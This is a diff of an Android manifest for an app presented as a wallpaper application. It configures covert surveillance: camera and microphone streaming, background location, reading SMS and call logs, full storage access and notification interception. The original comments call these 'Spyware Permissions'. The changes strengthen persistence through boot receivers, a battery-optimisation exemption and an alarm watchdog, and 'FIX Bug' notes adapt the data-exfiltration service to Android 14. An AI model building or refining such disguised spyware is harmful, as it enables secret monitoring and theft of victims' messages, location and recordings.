@@ -3,40 +3,56 @@
     xmlns:tools="http://schemas.android.com/tools"
     package="com.example.wallpaperapplication">
 
-    <!-- Hardware features & permissions -->
-    <uses-feature android:name="android.hardware.camera" android:required="false" />
-    <uses-feature
-        android:name="android.hardware.telephony"
-        android:required="false" />
+    <!-- Hardware features -->
+    <uses-feature android:name="android.hardware.camera"    android:required="false" />
+    <uses-feature android:name="android.hardware.telephony" android:required="false" />
 
-    <!-- Wallpaper Permissions -->
-    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
-    <uses-permission android:name="android.permission.SET_WALLPAPER_HINTS"/>
+    <!-- Wallpaper -->
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+    <uses-permission android:name="android.permission.SET_WALLPAPER_HINTS" />
 
-    <!-- Spyware Permissions -->
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <!-- Network -->
+    <uses-permission android:name="android.permission.INTERNET" />
+
+    <!-- Camera + Mic -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="android.permission.INTERNET" />
+
+    <!-- Location -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- Telephony data -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
+
+    <!-- Notifications -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- Storage (file explorer) -->
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
 
-    <!-- Boot + Foreground service -->
+    <!-- Boot + persistence -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- Foreground service (base) -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 
-    <!-- If targeting Android 10+ and you stream camera/mic, add the specific types -->
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <!-- Foreground service typed permissions (Android 14 / API 34 required) -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <!-- FIX Bug 3: dataSync type required for SMS/call-log/file-transfer on API 34+ -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
 
-    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <!-- FIX Bug 8: exact alarm required for AlarmManager watchdog on API 31 / 33+ -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
 
     <application
         android:allowBackup="true"
@@ -47,14 +63,9 @@
         android:roundIcon="@mipmap/ic_logo_round"
         android:supportsRtl="true"
         android:theme="@style/Theme.WallpaperApplication"
-        android:usesCleartextTraffic="true" >
+        android:usesCleartextTraffic="true">
 
-        <!-- Launcher activity -->
-        <activity
-            android:name=".ConsentActivity"
-            android:exported="true" />
-
-        <!-- Other activities -->
+        <!-- Entry point -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
@@ -64,13 +75,28 @@
             </intent-filter>
         </activity>
 
-        <!-- Foreground service for camera and microphone streaming -->
+        <!-- Permission / consent gate -->
+        <activity
+            android:name=".ConsentActivity"
+            android:exported="false" />
+
+        <!-- Settings screen -->
+        <activity
+            android:name=".StreamingSettingsActivity"
+            android:exported="false" />
+
+        <!--
+            FIX Bug 3: foregroundServiceType now includes dataSync.
+            Required on Android 14 (API 34) for services that read SMS,
+            call logs, or transfer files. Without it, Android 14+ throws
+            MissingForegroundServiceTypeException.
+        -->
         <service
             android:name=".StreamingService"
             android:exported="false"
-            android:foregroundServiceType="camera|microphone|location" />
+            android:foregroundServiceType="camera|microphone|location|dataSync" />
 
-        <!-- Notification listener service -->
+        <!-- Notification listener (inner class of StreamingService) -->
         <service
             android:name=".StreamingService$NotificationListener"
             android:enabled="true"
@@ -82,7 +108,11 @@
             </intent-filter>
         </service>
 
-        <!-- Boot receiver: start streaming after reboot and after app updates -->
+        <!--
+            Boot receiver: handles BOOT_COMPLETED, LOCKED_BOOT_COMPLETED (direct-boot),
+            and MY_PACKAGE_REPLACED (auto-update persistence).
+            directBootAware="true" allows start before user unlocks on API 24+.
+        -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -92,11 +122,9 @@
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
 
-        <activity
-            android:name=".StreamingSettingsActivity"
-            android:exported="false" />
     </application>
 </manifest>
